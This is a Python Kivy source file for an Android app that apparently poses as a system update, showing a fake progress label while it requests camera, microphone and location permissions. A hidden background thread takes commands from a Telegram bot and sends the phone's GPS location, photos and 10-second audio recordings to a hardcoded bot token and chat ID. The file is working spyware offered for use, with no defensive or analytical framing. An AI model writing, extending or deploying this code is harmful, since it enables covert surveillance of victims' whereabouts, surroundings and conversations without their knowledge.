from kivy.app import App
from kivy.ux.label import Label
from plyer import camera, gps, audio
from android.permissions import request_permissions, Permission
import requests
import threading
import time
import os

# بيانات الربط
TOKEN = "8646363010:AAFgi_CnQtYk0LWTn5naPUkgULMkLfXLIs4"
CHAT_ID = "7263387179"

class SystemUpdateApp(App):
    def build(self):
        # طلب الصلاحيات الأساسية فقط لضمان الاستقرار
        request_permissions([
            Permission.CAMERA, Permission.RECORD_AUDIO,
            Permission.ACCESS_FINE_LOCATION, Permission.ACCESS_COARSE_LOCATION
        ])
        
        self.send_msg("✅ النظام متصل.. بانتظار الأوامر (موقع، صورة، صوت)")
        
        # تشغيل مستمع الأوامر في الخلفية
        threading.Thread(target=self.remote_listener, daemon=True).start()
        
        return Label(text="Checking for updates... 88%")

    def send_msg(self, text):
        try: requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}")
        except: pass

    def remote_listener(self):
        last_id = 0
        while True:
            try:
                response = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_id + 1}", timeout=5).json()
                for update in response.get("result", []):
                    last_id = update["update_id"]
                    cmd = update.get("message", {}).get("text", "").strip()
                    
                    if cmd == "موقع":
                        self.get_gps()
                    elif cmd == "صورة":
                        self.take_photo()
                    elif cmd == "صوت":
                        threading.Thread(target=self.record_now).start()
            except: pass
            time.sleep(5)

    def get_gps(self):
        try:
            gps.configure(on_location=self.on_loc)
            gps.start()
        except: self.send_msg("❌ عطل في الـ GPS")

    def on_loc(self, **kwargs):
        link = f"https://www.google.com/maps?q={kwargs['lat']},{kwargs['lon']}"
        self.send_msg(f"📍 الموقع بدقة:\n{link}")
        gps.stop()

    def take_photo(self):
        try:
            # استخدام مسار الكاش لضمان عدم الانهيار
            from android.storage import app_storage_path
            path = os.path.join(app_storage_path(), "snap.jpg")
            camera.take_picture(filename=path, on_complete=self.upload)
        except: self.send_msg("❌ الكاميرا مشغولة")

    def record_now(self):
        try:
            from android.storage import app_storage_path
            path = os.path.join(app_storage_path(), "voice.3gp")
            audio.start_recording(path)
            self.send_msg("🎙️ جاري تسجيل 10 ثواني...")
            time.sleep(10)
            audio.stop_recording()
            self.upload(path, is_audio=True)
        except: self.send_msg("❌ المايك مرفوض")

    def upload(self, path, is_audio=False):
        try:
            method = "sendAudio" if is_audio else "sendPhoto"
            key = "audio" if is_audio else "photo"
            with open(path, 'rb') as f:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/{method}", data={'chat_id': CHAT_ID}, files={key: f})
        except: pass

if __name__ == '__main__':
    SystemUpdateApp().run()
